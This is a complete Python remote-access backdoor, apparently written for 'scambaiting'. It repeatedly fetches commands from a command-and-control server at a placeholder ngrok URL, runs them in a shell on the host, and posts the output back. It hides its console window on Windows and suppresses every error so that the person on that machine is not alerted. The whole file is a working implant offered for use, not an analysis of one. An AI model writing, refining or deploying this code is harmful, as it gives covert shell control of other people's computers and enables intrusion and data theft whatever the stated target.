import subprocess
import requests
import time
import json
import sys
import os

# !!! REPLACE WITH YOUR NGROK HTTPS URL !!!
# Example: https://abc123.ngrok.io
REMOTE_C2 = "<URL>"

# Polling interval (seconds) - how often the victim checks for commands
POLL_INTERVAL = 3

def send_output(output):
    """Send command output back to the Expert C2 server."""
    try:
        url = f"{REMOTE_C2}/output"
        headers = {'Content-Type': 'application/json'}
        data = json.dumps({'output': output})
        requests.post(url, headers=headers, data=data, timeout=5)
    except Exception:
        # Silently fail - don't alert the Scammer
        pass

def get_command():
    """Fetch the next command from the Expert C2 server."""
    try:
        url = f"{REMOTE_C2}/command"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data.get('command', '')
    except Exception:
        pass
    return None

def main():
    # Hide the terminal window when the .exe runs on Windows
    if os.name == 'nt':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    while True:
        try:
            command = get_command()
            
            if command is not None and command.strip() != "":
                # If the expert types 'exit', kill the payload
                if command.lower() == "exit":
                    sys.exit(0)
                
                # Execute the command
                output = subprocess.run(command, shell=True, 
                                        capture_output=True, text=True)
                result = output.stdout + output.stderr
                if result == "":
                    result = "[+] Command executed successfully (no output)."
                
                # Send results back to the expert
                send_output(result)
            
            # Sleep before checking for the next command
            time.sleep(POLL_INTERVAL)
            
        except Exception:
            # Keep running silently even if errors occur
            time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
